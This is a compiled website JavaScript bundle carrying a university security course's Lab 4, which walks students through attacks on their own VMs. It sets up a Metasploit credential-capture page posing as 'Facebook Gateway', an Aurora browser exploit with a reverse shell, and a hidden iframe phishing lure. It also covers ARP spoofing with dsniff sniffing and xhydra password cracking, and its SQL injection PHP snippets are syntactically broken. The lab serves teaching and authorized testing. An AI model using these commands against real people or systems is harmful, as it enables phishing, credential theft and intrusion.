"use strict";(self.webpackChunkSEC520=self.webpackChunkSEC520||[]).push([[659],{3905:function(e,t,a){a.d(t,{Zo:function(){return c},kt:function(){return h}});var n=a(7294);function o(e,t,a){return t in e?Object.defineProperty(e,t,{value:a,enumerable:!0,configurable:!0,writable:!0}):e[t]=a,e}function r(e,t){var a=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);t&&(n=n.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),a.push.apply(a,n)}return a}function s(e){for(var t=1;t<arguments.length;t++){var a=null!=arguments[t]?arguments[t]:{};t%2?r(Object(a),!0).forEach((function(t){o(e,t,a[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(a)):r(Object(a)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(a,t))}))}return e}function i(e,t){if(null==e)return{};var a,n,o=function(e,t){if(null==e)return{};var a,n,o={},r=Object.keys(e);for(n=0;n<r.length;n++)a=r[n],t.indexOf(a)>=0||(o[a]=e[a]);return o}(e,t);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);for(n=0;n<r.length;n++)a=r[n],t.indexOf(a)>=0||Object.prototype.propertyIsEnumerable.call(e,a)&&(o[a]=e[a])}return o}var l=n.createContext({}),p=function(e){var t=n.useContext(l),a=t;return e&&(a="function"==typeof e?e(t):s(s({},t),e)),a},c=function(e){var t=p(e.components);return n.createElement(l.Provider,{value:t},e.children)},m={inlineCode:"code",wrapper:function(e){var t=e.children;return n.createElement(n.Fragment,{},t)}},u=n.forwardRef((function(e,t){var a=e.components,o=e.mdxType,r=e.originalType,l=e.parentName,c=i(e,["components","mdxType","originalType","parentName"]),u=p(a),h=o,d=u["".concat(l,".").concat(h)]||u[h]||m[h]||r;return a?n.createElement(d,s(s({ref:t},c),{},{components:a})):n.createElement(d,s({ref:t},c))}));function h(e,t){var a=arguments,o=t&&t.mdxType;if("string"==typeof e||o){var r=a.length,s=new Array(r);s[0]=u;var i={};for(var l in t)hasOwnProperty.call(t,l)&&(i[l]=t[l]);i.originalType=e,i.mdxType="string"==typeof e?e:o,s[1]=i;for(var p=2;p<r;p++)s[p]=a[p];return n.createElement.apply(null,s)}return n.createElement.apply(null,a)}u.displayName="MDXCreateElement"},6594:function(e,t,a){a.r(t),a.d(t,{assets:function(){return l},contentTitle:function(){return s},default:function(){return m},frontMatter:function(){return r},metadata:function(){return i},toc:function(){return p}});var n=a(3117),o=(a(7294),a(3905));const r={id:"lab4",title:"Lab 4",sidebar_position:4,description:"Lab 4 for Students to Complete and Submit"},s="Lab 4",i={unversionedId:"A-Labs/lab4",id:"A-Labs/lab4",title:"Lab 4",description:"Lab 4 for Students to Complete and Submit",source:"@site/docs/A-Labs/lab4.md",sourceDirName:"A-Labs",slug:"/A-Labs/lab4",permalink:"/SEC520/A-Labs/lab4",draft:!1,editUrl:"https://github.com/Seneca-ICTOER/SEC520/tree/main/docs/A-Labs/lab4.md",tags:[],version:"current",sidebarPosition:4,frontMatter:{id:"lab4",title:"Lab 4",sidebar_position:4,description:"Lab 4 for Students to Complete and Submit"},sidebar:"courseNotesSidebar",previous:{title:"Lab 3",permalink:"/SEC520/A-Labs/lab3"},next:{title:"Lab 5",permalink:"/SEC520/A-Labs/lab5"}},l={},p=[{value:"Types of Attacks",id:"types-of-attacks",level:2},{value:"Introduction",id:"introduction",level:3},{value:"Objectives",id:"objectives",level:3},{value:"Required Materials (Bring to All Labs)",id:"required-materials-bring-to-all-labs",level:3},{value:"Prerequisites",id:"prerequisites",level:3},{value:"Online Tools and References",id:"online-tools-and-references",level:3},{value:"Course Notes",id:"course-notes",level:3},{value:"Performing Lab 4",id:"performing-lab-4",level:2},{value:"Task #1: Web-browser Redirect (Phishing) Attacks",id:"task-1-web-browser-redirect-phishing-attacks",level:3},{value:"Task #2: IP Spoofing (Man in the Middle) Attacks / Packet Sniffing",id:"task-2-ip-spoofing-man-in-the-middle-attacks--packet-sniffing",level:3},{value:"Task #3: Database Injection Attack",id:"task-3-database-injection-attack",level:3},{value:"Task #4: Password Cracking Attack",id:"task-4-password-cracking-attack",level:3},{value:"Completing the Lab",id:"completing-the-lab",level:2},{value:"Preparing for Quizzes",id:"preparing-for-quizzes",level:2}],c={toc:p};function m(e){let{components:t,...a}=e;return(0,o.kt)("wrapper",(0,n.Z)({},c,a,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"lab-4"},"Lab 4"),(0,o.kt)("h2",{id:"types-of-attacks"},"Types of Attacks"),(0,o.kt)("h3",{id:"introduction"},"Introduction"),(0,o.kt)("p",null,"In the previous lab, you learned how to perform penetration testing on a vulnerable (target) server. You learned how to perform scanning and enumeration, and then ran vulnerability testing software (eg. Metasploit) to gain access to your Windows server."),(0,o.kt)("p",null,"In this lab, students will learn ",(0,o.kt)("strong",{parentName:"p"},"other methods of vulnerability testing")," to gain access to vulnerable servers:"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"This lab will allow students to identify and practice common types of attacks that occur on targeted computer systems."),(0,o.kt)("li",{parentName:"ul"},"First, students will be exposed to ",(0,o.kt)("strong",{parentName:"li"},"Client-side")," attacks (usually initiated by the server's users) including ",(0,o.kt)("strong",{parentName:"li"},"Malicious web-page Payloads"),", and ",(0,o.kt)("strong",{parentName:"li"},"IP Spoofing")," (Man in the Middle) attacks."),(0,o.kt)("li",{parentName:"ul"},"Then, students will focus on ",(0,o.kt)("strong",{parentName:"li"},"Server-side")," attacks such as ",(0,o.kt)("strong",{parentName:"li"},"Server-side Injection"),", and ",(0,o.kt)("strong",{parentName:"li"},"Password")," attacks.")),(0,o.kt)("h3",{id:"objectives"},"Objectives"),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"Access a server by creating a webpage using the ",(0,o.kt)("strong",{parentName:"li"},"<iframe",">")," tag to redirect a user to a ",(0,o.kt)("strong",{parentName:"li"},"Metasploit exploit")," in order to gain access to the computer system."),(0,o.kt)("li",{parentName:"ol"},"Understand how ",(0,o.kt)("strong",{parentName:"li"},"phishing")," can be used to have the user inadvertantly activate (trigger) HTML code to access a vulnerable server via a web-browser."),(0,o.kt)("li",{parentName:"ol"},"Perform ",(0,o.kt)("strong",{parentName:"li"},"IP Spoofing")," (Man in the Middle) attacks in order to obtain useful information between a connect between computers."),(0,o.kt)("li",{parentName:"ol"},"Access and manipulate a database server to gain access into the targeted server."),(0,o.kt)("li",{parentName:"ol"},"Use a ",(0,o.kt)("strong",{parentName:"li"},"password cracking program")," to discover and access user accounts, and possibly root access.")),(0,o.kt)("h3",{id:"required-materials-bring-to-all-labs"},"Required Materials (Bring to All Labs)"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"SATA Hard Disk")," (in removable disk tray)."),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"Lab Logbook (Lab6 Reference Sheet)")," (to make notes and observations).")),(0,o.kt)("h3",{id:"prerequisites"},"Prerequisites"),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"/SEC520/A-Labs/lab3"},"SEC520 Lab 3")),(0,o.kt)("h3",{id:"online-tools-and-references"},"Online Tools and References"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"http://www.ehacking.net/2011/10/metasploit-tutorials-from-beginner-to.html"},"Metasploit Framework")),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"http://www.irongeek.com/i.php?page=security/arpspoof"},"arpspoof")),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"http://arhodes505.awardspace.us/minituts/xhydra.htm"},"xhydra"))),(0,o.kt)("h3",{id:"course-notes"},"Course Notes"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"http://cs.senecac.on.ca/~fac/sec520/slides/sec520_w7_l1.odp"},"odp")," | ",(0,o.kt)("a",{parentName:"li",href:"http://cs.senecac.on.ca/~fac/sec520/slides/sec520_w7_l1.pdf"},"pdf")," | ",(0,o.kt)("a",{parentName:"li",href:"http://cs.senecac.on.ca/~fac/sec520/slides/sec520_w7_l1.ppt"},"ppt")," (Slides: Types of Attacks)"),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"http://www.youtube.com/watch?v=ZUygX8TBBw0"},"Phishing")," | ",(0,o.kt)("a",{parentName:"li",href:"http://www.youtube.com/watch?v=PqfZM3Lxrmg"},"Malicious Payload")," | ",(0,o.kt)("a",{parentName:"li",href:"http://www.youtube.com/watch?v=-hd7XG-b6uk"},"IP Spoofing")," | ",(0,o.kt)("a",{parentName:"li",href:"http://www.youtube.com/watch?v=AhTfo6pWBIM"},"Database Injection")," (YouTube Videos)")),(0,o.kt)("h2",{id:"performing-lab-4"},"Performing Lab 4"),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"CAUTION!")),(0,o.kt)("p",null,"Scanning ports and exploiting servers must\nrequire the permission of Server Owner (preferably in writing). Students"),(0,o.kt)("p",null,"must either use their VMs, use the IFS lab (if available), or sign an agreement to use the ",(0,o.kt)("strong",{parentName:"p"},"Tank")," server when practising these computer system intrusion methods."),(0,o.kt)("h3",{id:"task-1-web-browser-redirect-phishing-attacks"},"Task #1: Web-browser Redirect (Phishing) Attacks"),(0,o.kt)("p",null,"This section will demonstrate the vulnerability of a computer system with one of its weakest links: ",(0,o.kt)("em",{parentName:"p"},"Humans"),". You will be using the ",(0,o.kt)("strong",{parentName:"p"},"Metasploit")," framework to create an attack on your server that will ",(0,o.kt)("em",{parentName:"p"},"exploit")," and ",(0,o.kt)("em",{parentName:"p"},"gain access")," to your target machine. You will also learn how you can redirect users to this attack site to deliver the malicious payload to that targeted computer."),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"INSTRUCTIONS:")),(0,o.kt)("p",null,'Metasploit is a very versatile tool for penetration testing. In addition to gaining access to "targeted" computer systems by using the ',(0,o.kt)("strong",{parentName:"p"},"Armitage")," frontend, other strategies such as ",(0,o.kt)("em",{parentName:"p"},"lurking")," to gain access (via reverse shell) by redirecting web-browser traffic are also available."),(0,o.kt)("p",null,"In this section, we will be using the mfs-console to issue commands to exploit via the web-browser. Before we start, we should update our Metasploit Framework. In order to achieve this, we will update the older version of Metasploit that came with our Kali Linux edition with a new version:"),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Using The MSF Console")),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"msfconsole")," is a shell that allows penetration testers to issue commands when working with Metasploit. For example, IFS students in the degree program are expected to perform penetration testing more in the msfconsole than using Metasploit GUIs like Armatage!"),(0,o.kt)("p",null,"We will be running the ",(0,o.kt)("strong",{parentName:"p"},"msfconsole")," command to access the command shell, and setup a typical phishing attack."),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("p",{parentName:"li"},"Login as ",(0,o.kt)("strong",{parentName:"p"},"root")," user, and issue the command: ",(0,o.kt)("inlineCode",{parentName:"p"},"msfconsole")," (ignore error, console should eventually load). If problems persist check to see if the Metasploit server is running."),(0,o.kt)("ul",{parentName:"li"},(0,o.kt)("li",{parentName:"ul"},"Next, we will be generating an attack payload (code) that can be executed from an html file (via a form button) to gain access to the computer system. Perform the following steps to create this payload (html) file:"))),(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("p",{parentName:"li"},"In the ",(0,o.kt)("strong",{parentName:"p"},"msfconsole"),", issue the following commands:"))),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"  use auxiliary/server/capture/http_basic\n  show options\n  set REALM Facebook Gateway\n  set URIPATH /\n  run\n")),(0,o.kt)("ol",{start:3},(0,o.kt)("li",{parentName:"ol"},"Note the ",(0,o.kt)("strong",{parentName:"li"},"LOCAL IP ADDRESS"),". You will be entering that address in a web-browser on your targeted Windows server."),(0,o.kt)("li",{parentName:"ol"},'Your attack server (running Metasploit) is now "lurking" until the user enters data in a windows dialog box.')),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Disable Internet Explorer Enhanced Security:")," In order to demonstrate this attack, we will disable Internet Explorer Enhanced Security. Perform the instructions below to disable this feature."),(0,o.kt)("ol",{start:5},(0,o.kt)("li",{parentName:"ol"},"Switch to your vulnerable Windows server, make certain that you are logged in as ",(0,o.kt)("strong",{parentName:"li"},"Administrator"),"."),(0,o.kt)("li",{parentName:"ol"},"Open the ",(0,o.kt)("strong",{parentName:"li"},"Control Panel"),", select ",(0,o.kt)("strong",{parentName:"li"},"Add or Remove Programs"),", select ",(0,o.kt)("strong",{parentName:"li"},"Add/Remove Windows Components"),". Click to select ",(0,o.kt)("strong",{parentName:"li"},"Internet Explorer Enhanced Security Configuration")," and click ",(0,o.kt)("strong",{parentName:"li"},"Details"),". Unclick the checkboxes for admin and all other users and then click ",(0,o.kt)("strong",{parentName:"li"},"Next"),"."),(0,o.kt)("li",{parentName:"ol"},"Login into a regular user account and open a web-browser."),(0,o.kt)("li",{parentName:"ol"},"Enter the IP ADDRESS for the attack web-site. Enter a username and password when prompted by the dialog box"),(0,o.kt)("li",{parentName:"ol"},"Now, switch to your attack machine (i.e. host), and you should see a notification of the exploit. Where you able to determine the username and password?"),(0,o.kt)("li",{parentName:"ol"},"Did you think it would be harder to exploit a machine in this way?"),(0,o.kt)("li",{parentName:"ol"},"How popular do you think this type of human-based attack is?"),(0,o.kt)("li",{parentName:"ol"},'How can you prevent this type of attack from occurring on a "hardened system"?'),(0,o.kt)("li",{parentName:"ol"},"Record your findings in your lab log-book.")),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"The Phishing Attack (For Interest Only)")),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"WARNING! Only try this for penetration testing on your VMs or on servers that you have permission to perform penetration testing!")),(0,o.kt)("p",null,"Only You have created a mechanism to gain access to a vulnerable system by using the targeted system's web-browser. All the ",(0,o.kt)("strong",{parentName:"p"},"penetration tester")," needs to do, is to set an ",(0,o.kt)("strong",{parentName:"p"},'elaborate "trap" to redirect the user to your host\'s IP_ADDRESS'),", disguised as a regular link."),(0,o.kt)("p",null,"Here is how simple (subtle) it can be:"),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("p",{parentName:"li"},'Perform a Google search to use msfconsole to setup a "reverse shell attack" by entering the console commands:'),(0,o.kt)("ul",{parentName:"li"},(0,o.kt)("li",{parentName:"ul"},"use windows/browser/ms10_002_aurora"),(0,o.kt)("li",{parentName:"ul"},"set generic/shell_reverse tcp"),(0,o.kt)("li",{parentName:"ul"},"set LHOST (your attack host IP ADDRESS)"),(0,o.kt)("li",{parentName:"ul"},"set URIPATH /"),(0,o.kt)("li",{parentName:"ul"},"set LPORT 7371"),(0,o.kt)("li",{parentName:"ul"},"set SRVPORT 80"),(0,o.kt)("li",{parentName:"ul"},"exploit"))),(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("p",{parentName:"li"},'Create a "phony" facebook notification for the "targeted" user on the system (this is where the reconnaissance (information gathering) phase comes in handy such as e-mail usernames and facebook accounts.')),(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("p",{parentName:"li"},"Here is a link to sample HTML code: ",(0,o.kt)("a",{parentName:"p",href:"https://scs.senecac.on.ca/~fac/sec520/labs/email-attachment-template.html.txt"},"Template of e-mail attachment"))),(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("p",{parentName:"li"},"Edit the file to contain the following iframe (that will draw the user to your attack website):"))),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-html"},'<iframe src="ATTACK_SERVER_IP_ADDRESS" width="100" height="0"> </iframe>\n')),(0,o.kt)("ol",{start:5},(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("p",{parentName:"li"},"We could then send this HTML file via an e-mail to the user (in this case masquerading as a facebook notification. You could simulate this attack for demonstration by creating the html file in your Windows server, and load this file with a web-browser (like Internet Explorer)."),(0,o.kt)("ul",{parentName:"li"},(0,o.kt)("li",{parentName:"ul"},'Another approach would be to send a "phony" notification with links to the facebook "login" page with the <iframe',">"," element."))),(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("p",{parentName:"li"},"Proceed to Task #2"))),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Answer the Task #1 observations / questions in your lab log book.")),(0,o.kt)("h3",{id:"task-2-ip-spoofing-man-in-the-middle-attacks--packet-sniffing"},"Task #2: IP Spoofing (Man in the Middle) Attacks / Packet Sniffing"),(0,o.kt)("p",null,"This section will demonstrate an ",(0,o.kt)("strong",{parentName:"p"},"IP Spoofing"),' attack (sometimes referred to as "',(0,o.kt)("em",{parentName:"p"},"arp poisoning"),'") where the target server is "tricked" into communicating with a server that assumes has the correct MAC address. The attacker can then "',(0,o.kt)("strong",{parentName:"p"},"feed packets"),'" to the destination allowing for an uninterupted session to obtain information such as usernames and passwords.'),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"INSTRUCTIONS:")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"We will be using your ",(0,o.kt)("strong",{parentName:"li"},"Kali Linux")," host machine, ",(0,o.kt)("strong",{parentName:"li"},"Vulnerable Windows VM"),", and ",(0,o.kt)("strong",{parentName:"li"},"Vulnerable Linux VM")," for this section."),(0,o.kt)("li",{parentName:"ol"},"Note the IP Address of your Windows server."),(0,o.kt)("li",{parentName:"ol"},"Make certain that your Windows machine is running an FTP server. Set up the FTP server to only allow users to access the FTP server by username and password (possibly not required from default installation and startup)."),(0,o.kt)("li",{parentName:"ol"},'For demonstration purposes of this "man in the middle" attack, open a command prompt, and issue the following MS-Windows command:')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"ping LINUX_IP_ADDR -t\n")),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"You should now see proof of a connection between your vulnerable Windows and Linux servers.")),(0,o.kt)("ol",{start:5},(0,o.kt)("li",{parentName:"ol"},"Switch to your vulnerable Linux server, open a shell terminal, and note the IP Address of your vulnerable Linux server."),(0,o.kt)("li",{parentName:"ol"},'Open another shell terminal, and issue the following Linux command to continuously "ping" the Windows server:')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"ping WINDOWS_IP_ADDR\n")),(0,o.kt)("ol",{start:7},(0,o.kt)("li",{parentName:"ol"},'We will now trick the Windows server into thinking that the attack (Kali Linux or "host") server is the destination server.'),(0,o.kt)("li",{parentName:"ol"},"Switch to your Kali Linux (host) server, and open a shell terminal."),(0,o.kt)("li",{parentName:"ol"},"While in the host (attack) machine, issue the following Linux command:")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"sudo arpspoof -t WINDOWS_IP_ADDR LINUX_IP_ADDR\n")),(0,o.kt)("ol",{start:10},(0,o.kt)("li",{parentName:"ol"},'We need to continue the "man in the middle" attack by now performing the same manuever for the Linux VM. While still in the host (attack) machine, open another shell terminal and issue the following Linux command:')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"sudo arpspoof -t LINUX_IP_ADDR_LINUX WINDOWS_IP_ADDR\n")),(0,o.kt)("ol",{start:11},(0,o.kt)("li",{parentName:"ol"},"Switch to first your vulnerable Windows machine to view the pings. What do you notice? Do the same for your vulnerable Linux machine. Record your findings in your lab log-book.")),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Connection Disconnected:"),' When initionally performing an "IP Spoof", the connection between the machines is temporary broken. In order to re-establish a connection (via the "man in the middle") the attacker must establish ',(0,o.kt)("strong",{parentName:"p"},"IP FORWARDING"),"."),(0,o.kt)("ol",{start:12},(0,o.kt)("li",{parentName:"ol"},'To complete the "man in the middle" attack, you are required to establish ',(0,o.kt)("strong",{parentName:"li"},"IP FORWARDING"),". Open another shell window in your host (attack) machine, and issue the following Linux command in your attack host:")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"sudo su           # login with admin passord\necho 1 > /proc/sys/net/ipv4/ip_forward\n")),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},'(This means to set IP FORWARDING to "True" or "On")')),(0,o.kt)("ol",{start:13},(0,o.kt)("li",{parentName:"ol"},"Switch to your vulnerable Windows and Linux machines. Is the connection (using the ping command) re-established? Record your findings in your lab log-book.")),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Obtaining Username / Password Information")),(0,o.kt)("p",null,"One of the main reasons for a ",(0,o.kt)("strong",{parentName:"p"},'"man in the middle" attack')," is to obtain sensitive information such as a username and password for further exploitation. A ",(0,o.kt)("strong",{parentName:"p"},"Packet Sniffer"),' is a useful tool when using a "man in the middle attack". Throughout your journey in the area of Internet Security, you will soon learn there is an ambundence of tools, many of which do the same thing (including packet sniffers). For the remainder of this section we will use a packet sniffer tool called ',(0,o.kt)("strong",{parentName:"p"},"dsniff"),"."),(0,o.kt)("ol",{start:14},(0,o.kt)("li",{parentName:"ol"},"On an available shell terminal on your host (attack) server, and issue the following Linux command:")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"dsniff\n")),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"(",(0,o.kt)("strong",{parentName:"li"},"tip"),": Use the command: ",(0,o.kt)("inlineCode",{parentName:"li"},"find -P . | grep dsniff")," to locate dsniff superuser executable)")),(0,o.kt)("ol",{start:15},(0,o.kt)("li",{parentName:"ol"},"This packet sniffer program will lurk until a user from the Linux VM establishes a connection with the Windows VM FTP SERVER."),(0,o.kt)("li",{parentName:"ol"},"Switch to your vulnerable Linux server, and establish an FTP connection with the Windows FTP server.")),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"FTP Doesn't Work / Alternative Arp Posioning Method:")," Students have noticed that when using Kali Linux as a host machine for the vulnerable Windows and Linux VMs they experience a problem when using the ",(0,o.kt)("strong",{parentName:"p"},"arpspoof")," command. You can use the ",(0,o.kt)("strong",{parentName:"p"},"ettercap")," command as an alternative command which does not require port forwarding and performs the dsniff command as well. To run the ettercap command, issue the following command: "),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"ettercap -T -M arp /// /// -i vboxnet0\n")),(0,o.kt)("ol",{start:17},(0,o.kt)("li",{parentName:"ol"},"Then switch back to your host (attack) server."),(0,o.kt)("li",{parentName:"ol"},"What do you notice? Is this information sufficent to logon as a Windows system user? Record your findings in your lab log-book."),(0,o.kt)("li",{parentName:"ol"},"Return to your vulnerable Linux server, and close the FTP connection with the Windows server."),(0,o.kt)("li",{parentName:"ol"},"Switch back to your attack server. What information does ",(0,o.kt)("strong",{parentName:"li"},"dsniff")," provide?"),(0,o.kt)("li",{parentName:"ol"},'What steps would a security analyst implement in order to reduce the possibility of a "man in the middle" attack?'),(0,o.kt)("li",{parentName:"ol"},"Record your findings/answers in your lab log-book."),(0,o.kt)("li",{parentName:"ol"},"Proceed to Task #3")),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Answer Task #2 observations / questions in your lab log book.")),(0,o.kt)("h3",{id:"task-3-database-injection-attack"},"Task #3: Database Injection Attack"),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"SQL injection attacks"),' are basically in the form of introducing or "injecting" malicious code via the input (form) for the SQL/MYSQL database, in order to gain access to the backend database. There are many different methods of injection attacks. We will demonstrate a fairly common method of injection attack which exploits a weakness for the MYSQL server (that fail to ',(0,o.kt)("strong",{parentName:"p"},"sanitize")," user input. In this case, the user inserting illegal characters (single quote i) within an established web-based database form."),(0,o.kt)("p",null,"In this section, we will only expose the student to the concept of an injection attack. ",(0,o.kt)("strong",{parentName:"p"},"You are NOT required to setup the MYSQL server, or run a SQL injection attack on your vulnerable machines...")),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"INSTRUCTIONS:")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"Study the following PHP code below:")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"<?php\n    \n    $user = $_POST['usr'];\n    \n    $user = \"anything' OR x='x\";\n\n  mysql_query(\"SELECT user,password FROM users WHERE user ' 'anything' or x='x'\");\n    \n?>\n")),(0,o.kt)("ol",{start:2},(0,o.kt)("li",{parentName:"ol"},"How could this code be incorporated with an HTML document (using a form) to perform a ",(0,o.kt)("strong",{parentName:"li"},"database injection")," attack? Record your answer in your lab log-book."),(0,o.kt)("li",{parentName:"ol"},"View the associated ",(0,o.kt)("strong",{parentName:"li"},"YouTube")," video in the resources above, and try briefly explained why this type of attack could work. Write your explanation in your lab log-book."),(0,o.kt)("li",{parentName:"ol"},"Now, make the following editing changes to your saved database form (areas to be changed are displayed in bold, red colour:")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"<?php\n    \n    $user = <span style=\"color:red;font-weight:bold\">mysql_real_escape_string(</span>$_POST['usr']<span style=\"color:red;font-weight:bold\">)</span>;\n    \n    $user = \"anything' OR x='x\";\n    \n  mysql_query(\"SELECT user,password FROM users WHERE user ' 'anything' or x='x'\");\n    \n?>\n")),(0,o.kt)("ol",{start:5},(0,o.kt)("li",{parentName:"ol"},"Try to explain how this last editing session prevented this SQL injection attack. Record your observations/answers in your lab log-book."),(0,o.kt)("li",{parentName:"ol"},"Proceed to Task #4.")),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Answer Task #3 observations / questions in your lab log book.")),(0,o.kt)("h3",{id:"task-4-password-cracking-attack"},"Task #4: Password Cracking Attack"),(0,o.kt)("p",null,"In this section, you will learn another technique to crack passwords by obtaining ",(0,o.kt)("em",{parentName:"p"},"usernames")," from e-mail addresses, and then running a ",(0,o.kt)("em",{parentName:"p"},"password cracking program")," to hopefully gain access to an account on a vulnerable Windows server that contains a weak password. Then, after gaining access to the account, we will then use a series of techniques to gain access to the administrator's account."),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"INSTRUCTIONS:")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"Go to your vulnerable Windows server, create a username called ",(0,o.kt)("strong",{parentName:"li"},"weak")," that contains a very weak password (no special characters, just words that could be contained in a dictionary)."),(0,o.kt)("li",{parentName:"ol"},"How could you obtain usernames (eg. e-mail usernames) for a targetted computer system? (review your labs and notes during the Reconnaissance Phase). Record your answer in your lab log-book."),(0,o.kt)("li",{parentName:"ol"},"Assuming that you have obtained a username (i.e. username: ",(0,o.kt)("strong",{parentName:"li"},"weak"),") from the reconnaissance phase. We will now be using a tool to gain access to the account on the targeted Windows server.")),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Cain Password Dictionary:")," A password cracking program requires a dictionary of common passwords. The file ",(0,o.kt)("strong",{parentName:"p"},"cain.txt")," is a popular dictionary of typical or common passwords that can be used to test for weak passwords on a server."),(0,o.kt)("ol",{start:4},(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("p",{parentName:"li"},"We need to download a dictionary file containing many of the weak password combinations to help crack a user's weak password. You can perform a Netsearch in order to save this dictionary as a text file."),(0,o.kt)("ul",{parentName:"li"},(0,o.kt)("li",{parentName:"ul"},"Here is a link to various password cracking dictionaries: ",(0,o.kt)("a",{parentName:"li",href:"http://www.skullsecurity.org/wiki/index.php/Passwords"},"http://www.skullsecurity.org/wiki/index.php/Passwords")),(0,o.kt)("li",{parentName:"ul"},"As root, download the compressed file (cain.txt.bz2) to your ",(0,o.kt)("strong",{parentName:"li"},"/root")," directory."))),(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("p",{parentName:"li"},"Decompress the file by issuing the following Linux command:"))),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"bunzip2 cain.txt.bz2\n")),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"xhydra:")," xhydra is a graphical frontend of a program that scans open ports, and attempts to crack account passwords that are weak using a dictionary file of potential passwords. Of course, you could have performed this task manually by using ",(0,o.kt)("strong",{parentName:"p"},"nmap")," to scan open ports, and use other password cracking tools (such as ",(0,o.kt)("strong",{parentName:"p"},"Cain and Able"),"), but ",(0,o.kt)("strong",{parentName:"p"},"xhydra")," performs these operations automatically."),(0,o.kt)("ol",{start:6},(0,o.kt)("li",{parentName:"ol"},"To launch the xhydra application as root (unless you are already in root), issue the following Linux command:")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"sudo xhydra\n")),(0,o.kt)("ol",{start:7},(0,o.kt)("li",{parentName:"ol"},"In the initial application window (ie. ",(0,o.kt)("strong",{parentName:"li"},"Target")," tab), enter the ",(0,o.kt)("strong",{parentName:"li"},"WINDOWS_IP_ADDR")," in the ",(0,o.kt)("strong",{parentName:"li"},"Target")," textbox."),(0,o.kt)("li",{parentName:"ol"},"Under the ",(0,o.kt)("strong",{parentName:"li"},"Protocol")," list-box, select ",(0,o.kt)("strong",{parentName:"li"},"ftp"),"."),(0,o.kt)("li",{parentName:"ol"},"In the ",(0,o.kt)("strong",{parentName:"li"},"Output Options")," section, check ",(0,o.kt)("strong",{parentName:"li"},"Be verbose"),", and check ",(0,o.kt)("strong",{parentName:"li"},"Show Attempts"),"."),(0,o.kt)("li",{parentName:"ol"},"Move to the next screen by clicking on the ",(0,o.kt)("strong",{parentName:"li"},"Passwords")," 